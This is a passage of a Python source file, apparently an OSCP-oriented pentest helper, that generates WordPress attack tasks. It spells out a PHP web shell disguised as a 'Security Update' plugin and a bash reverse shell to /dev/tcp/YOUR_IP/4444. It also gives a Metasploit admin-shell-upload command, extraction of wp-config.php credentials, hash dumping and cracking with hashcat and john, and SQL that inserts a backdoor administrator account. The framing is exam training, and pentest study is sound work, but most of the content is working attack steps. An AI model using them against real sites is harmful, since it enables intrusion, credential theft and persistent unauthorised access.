7. Access shell:
   {base_url}/wp-content/themes/THEME_NAME/404.php?cmd=id

   For twentytwenty theme:
   {base_url}/wp-content/themes/twentytwenty/404.php?cmd=whoami

8. Get theme name from earlier enumeration or:
   {base_url}/wp-content/themes/default/404.php

OSCP NOTE: This is the most common WordPress RCE path. Document theme name and exact file edited in exploitation.md.

Required: Administrator role credentials
Time estimate: 5 minutes once you have admin access''',
                        'estimated_time': '5 minutes'
                    }
                },
                {
                    'id': f'wordpress-plugin-upload-rce-{port}',
                    'name': 'RCE via Malicious Plugin Upload (Admin Required)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Upload backdoored WordPress plugin for code execution',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'Plugin upload successful',
                            'Plugin activation succeeds',
                            'Web shell accessible via plugin path',
                            'Code execution confirmed'
                        ],
                        'failure_indicators': [
                            'Plugin upload disabled',
                            'Zip file rejected',
                            'Plugin activation fails',
                            'User lacks install_plugins capability'
                        ],
                        'next_steps': [
                            'Access web shell via plugin URL',
                            'Establish reverse shell',
                            'Access file system and wp-config.php',
                            'Enumerate for privilege escalation',
                            'Document in exploitation.md'
                        ],
                        'alternatives': [
                            'Theme editor modification',
                            'Media upload + LFI',
                            'Use vulnerable plugin from searchsploit',
                            'Metasploit wp_admin_shell_upload module'
                        ],
                        'notes': f'''Create and upload malicious WordPress plugin:

1. Create plugin PHP file (shell.php):
<?php
/*
Plugin Name: Security Update
Description: Important security patch
Version: 1.0
Author: Admin
*/

system($_GET['cmd']);
?>

2. Create valid plugin structure:
mkdir security-update
mv shell.php security-update/
cd security-update
zip -r security-update.zip .

3. Login to WordPress: {base_url}/wp-admin/

4. Navigate to Plugins > Add New > Upload Plugin

5. Upload security-update.zip

6. Click "Install Now" and "Activate Plugin"

7. Access web shell:
{base_url}/wp-content/plugins/security-update/shell.php?cmd=id

8. Establish reverse shell:
{base_url}/wp-content/plugins/security-update/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

Alternative: Download known vulnerable plugin from exploit-db:
https://www.exploit-db.com/exploits/36374

OSCP: Document plugin path in notes. Plugin may survive theme changes.''',
                        'estimated_time': '10 minutes'
                    }
                },
                {
                    'id': f'wordpress-metasploit-rce-{port}',
                    'name': 'Metasploit wp_admin_shell_upload',
                    'type': 'command',
                    'metadata': {
                        'command': f'msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set USERNAME admin; set PASSWORD PASSWORD; run"',
                        'description': 'Automated WordPress RCE via Metasploit (requires admin credentials)',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'EXPLOIT'],
                        'flag_explanations': {
                            'use exploit/unix/webapp/wp_admin_shell_upload': 'WordPress admin shell upload exploit',
                            'set RHOSTS': 'Target IP address',
                            'set RPORT': 'Target port',
                            'set TARGETURI /': 'WordPress installation path (/ for root)',
                            'set USERNAME': 'WordPress admin username',
                            'set PASSWORD': 'WordPress admin password',
                            'run': 'Execute exploit'
                        },
                        'success_indicators': [
                            'Meterpreter session opened',
                            'Command shell obtained',
                            'Payload uploaded and executed'
                        ],
                        'failure_indicators': [
                            'Authentication failed',
                            'Upload blocked',
                            'Payload execution failed',
                            'Theme editor disabled'
                        ],
                        'next_steps': [
                            'Upgrade shell: python -c "import pty;pty.spawn(\'/bin/bash\')"',
                            'Find wp-config.php: find / -name wp-config.php 2>/dev/null',
                            'Extract database credentials',
                            'Check for privilege escalation vectors',
                            'Document full attack chain'
                        ],
                        'alternatives': [
                            'Manual theme editor method (more reliable)',
                            'Manual plugin upload',
                            'Direct PHP injection if upload available'
                        ],
                        'notes': 'Metasploit module automatically:\n1. Authenticates to WordPress\n2. Uploads payload plugin\n3. Activates plugin\n4. Establishes Meterpreter session\n\nOSCP: Be prepared to do this manually - Metasploit may be restricted or fail. Manual method is more reliable and demonstrates understanding.\n\nIf TARGETURI is not /:\n- WordPress in subdirectory: set TARGETURI /wordpress\n- Custom path: set TARGETURI /blog',
                        'estimated_time': '5 minutes'
                    }
                }
            ]
        }
        tasks['children'].append(exploitation_tasks)

        # PHASE 7: Post-Exploitation
        post_exploit_tasks = {
            'id': f'wordpress-post-exploit-{port}',
            'name': 'WordPress Post-Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': f'wordpress-db-extract-{port}',
                    'name': 'Extract WordPress Database Credentials',
                    'type': 'command',
                    'metadata': {
                        'command': 'grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" wp-config.php',
                        'description': 'Extract database credentials from wp-config.php (requires file system access)',
                        'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            'grep -E': 'Extended regex search',
                            'DB_NAME': 'Database name',
                            'DB_USER': 'Database username',
                            'DB_PASSWORD': 'Database password',
                            'DB_HOST': 'Database host (usually localhost or 127.0.0.1)'
                        },
                        'success_indicators': [
                            'All four DB_ constants extracted',
                            'Credentials in plain text',
                            'Can connect to database'
                        ],
                        'failure_indicators': [
                            'wp-config.php not found',
                            'File permissions deny read access',
                            'Credentials encrypted/obfuscated'
                        ],
                        'next_steps': [
                            'Connect to database: mysql -u DB_USER -pDB_PASSWORD -h DB_HOST DB_NAME',
                            'Dump user hashes: mysql -e "SELECT user_login,user_pass FROM wp_users"',
                            'Create admin user in database',
                            'Check for password reuse on other services',
                            'Document in post_exploitation.md'
                        ],
                        'alternatives': [
                            'cat wp-config.php | grep DB_',
                            'Read file via web shell if available',
                            'Use Metasploit post modules',
                            'Check environment variables: env | grep DB'
                        ],
                        'notes': 'wp-config.php locations:\n- /var/www/html/wp-config.php\n- /var/www/wordpress/wp-config.php\n- /usr/share/nginx/html/wp-config.php\n- Document root of web server\n\nOSCP: Database credentials often work for SSH, MySQL remote access, or other services. Always test credential reuse.',
                        'estimated_time': '2 minutes'
                    }
                },
                {
                    'id': f'wordpress-db-dump-users-{port}',
                    'name': 'Dump WordPress User Hashes from Database',
                    'type': 'command',
                    'metadata': {
                        'command': 'mysql -u USERNAME -pPASSWORD -h localhost -e "use DATABASE; SELECT concat_ws(\':\', user_login, user_pass) FROM wp_users;"',
                        'description': 'Extract all WordPress user hashes for offline cracking',
                        'tags': ['OSCP:HIGH', 'POST_EXPLOIT'],
                        'flag_explanations': {
                            '-u USERNAME': 'Database username from wp-config.php',
                            '-pPASSWORD': 'Database password (no space after -p)',
                            '-h localhost': 'Database host',
                            '-e': 'Execute SQL query',
                            'concat_ws': 'Concatenate with separator (format: username:hash)',
                            'wp_users': 'WordPress users table (prefix may vary: wp_, wpdb_, etc)'
                        },
                        'success_indicators': [
                            'User:hash pairs returned',
                            'Format: admin:$P$BxxxxxxxxxxxxxxxxxxxxxxxxxxxxXX',
                            'All users dumped'
                        ],
                        'failure_indicators': [
                            'Access denied for user',
                            'Unknown database',
                            'Table wp_users doesn\'t exist (different prefix)',
                            'Empty result set'
                        ],
                        'next_steps': [
                            'Save hashes to file: hashes.txt',
                            'Identify hash type: hashcat --identify',
                            'Crack with hashcat: hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt',
                            'Or john: john --format=phpass hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt',
                            'Test cracked passwords on other services'
                        ],
                        'alternatives': [
                            'Find table prefix: mysql -e "SHOW TABLES LIKE \'%users\'"',
                            'Direct database file access if mysql not available',
                            'Use WP-CLI: wp user list --field=user_login,user_pass',
                            'Metasploit post module: post/linux/gather/enum_configs'
                        ],
                        'notes': 'WordPress password hash format:\n- Type: phpass (portable PHP password hash)\n- Hashcat mode: 400\n- John format: phpass\n- Hash format: $P$BxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxX (34 chars)\n\nTable prefix:\n- Default: wp_\n- Custom: defined in wp-config.php as $table_prefix\n- Find it: grep table_prefix wp-config.php\n\nOSCP: Save hashes immediately - may be only chance to access database. Even if you can\'t crack them during exam, document them for report.',
                        'estimated_time': '5 minutes + cracking time'
                    }
                },
                {
                    'id': f'wordpress-db-create-admin-{port}',
                    'name': 'Create WordPress Admin User via Database',
                    'type': 'command',
                    'metadata': {
                        'command': 'mysql -u USERNAME -pPASSWORD -h localhost -e "use DATABASE; INSERT INTO wp_users (user_login, user_pass, user_email, user_status) VALUES (\'hacker\', MD5(\'password123\'), \'hacker@evil.com\', 0); SELECT @user_id := LAST_INSERT_ID(); INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (@user_id, \'wp_capabilities\', \'a:1:{s:13:\"administrator\";b:1;}\'), (@user_id, \'wp_user_level\', \'10\');"',
                        'description': 'Create new administrator account directly in database (backdoor persistence)',
                        'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'PERSISTENCE'],
                        'flag_explanations': {
                            'INSERT INTO wp_users': 'Create new user record',
                            'MD5(\'password123\')': 'WordPress accepts MD5 for new users (weak but functional)',
                            'user_status 0': 'Active user',
                            'LAST_INSERT_ID()': 'Get ID of newly created user',
                            'wp_usermeta': 'User metadata table (stores roles and permissions)',
                            'wp_capabilities': 'User roles (administrator = full access)',
                            'wp_user_level 10': 'Admin level (0-10, 10 = administrator)'
                        },
                        'success_indicators': [
                            'User created successfully',
                            'Can login at /wp-admin/ with new credentials',
                            'User has administrator role',
                            'Full access to WordPress dashboard'
                        ],
                        'failure_indicators': [
                            'Duplicate username error',
                            'Insert failed',
                            'Can login but no admin privileges',
                            'User not visible in admin panel'
                        ],
                        'next_steps': [
                            f'Login to WordPress: {base_url}/wp-admin/ (user: hacker, pass: password123)',
                            'Verify admin access',
                            'Use theme editor for RCE if not already done',
                            'Document as persistence mechanism',
                            'Change admin password via database for existing accounts'
                        ],
                        'alternatives': [
                            'Change existing admin password: UPDATE wp_users SET user_pass=MD5(\'hacked\') WHERE ID=1;',
                            'Promote existing user to admin: UPDATE wp_usermeta SET meta_value=\'a:1:{s:13:"administrator";b:1;}\' WHERE user_id=X AND meta_key=\'wp_capabilities\';',
                            'Use WP-CLI: wp user create hacker hacker@evil.com --role=administrator --user_pass=password123'
                        ],
                        'notes': 'WordPress user roles (wp_capabilities):\n- administrator: a:1:{s:13:"administrator";b:1;}\n- editor: a:1:{s:6:"editor";b:1;}\n- author: a:1:{s:6:"author";b:1;}\n\nUser levels (wp_user_level):\n- 10 = Administrator\n- 7 = Editor  \n- 2 = Author\n- 1 = Contributor\n- 0 = Subscriber\n\nOSCP: This is a backdoor/persistence technique. Creates admin access even if you lose shell. Document in post_exploitation.md.\n\nNote: Use stronger password in production. MD5 used here for simplicity.',
                        'estimated_time': '3 minutes'
                    }
                }
            ]
        }
        tasks['children'].append(post_exploit_tasks)

        # PHASE 8: Research and CVE Lookup (conditional)
        version = service_info.get('version', '')
        product = service_info.get('product', '')

        if version or 'wordpress' in product.lower():
            research_tasks = {
                'id': f'wordpress-research-{port}',
                'name': 'WordPress Vulnerability Research',
                'type': 'parent',
                'children': [
                    {
                        'id': f'wordpress-searchsploit-{port}',
                        'name': f'SearchSploit: WordPress {version if version else "Core"}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit wordpress {version}',
                            'description': 'Search ExploitDB for WordPress version-specific exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                'wordpress': 'Search term',
                                version: 'WordPress version number for targeted search'
                            },
                            'success_indicators': [
                                'Exploits found for specific version',
                                'Exploit paths shown',
                                'Can mirror exploits with -m flag'
                            ],
                            'failure_indicators': [
                                'No results found',
                                'Only generic exploits (not version-specific)'
                            ],
                            'next_steps': [
                                'Review exploit requirements and prerequisites',
                                'Mirror exploit code: searchsploit -m EDB-ID',
                                'Test exploits in order of likelihood',
                                'Search for plugin exploits: searchsploit wordpress PLUGIN_NAME'
                            ],
                            'alternatives': [
                                'WPScan vulnerability database lookup',
                                'Manual CVE search: https://cve.mitre.org',
                                'Google: "wordpress VERSION exploit"',
                                'Check vendor advisories: https://wordpress.org/news/category/security/'
                            ]
                        }
                    },
                    {
                        'id': f'wordpress-wpscan-vulns-{port}',
                        'name': 'WPScan Vulnerability Database Lookup',
                        'type': 'command',
                        'metadata': {
                            'command': f'wpscan --url {base_url} --api-token YOUR_TOKEN --enumerate vp,vt',
                            'description': 'Check WPScan database for known vulnerable plugins and themes',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                '--api-token': 'WPScan API token (free at wpscan.com/register)',
                                '--enumerate vp': 'Enumerate vulnerable plugins',
                                '--enumerate vt': 'Enumerate vulnerable themes'
                            },
                            'notes': 'Get free API token: https://wpscan.com/register\nFree tier: 50 API requests per day'
                        }
                    }
                ]
            }
            tasks['children'].append(research_tasks)

        return tasks
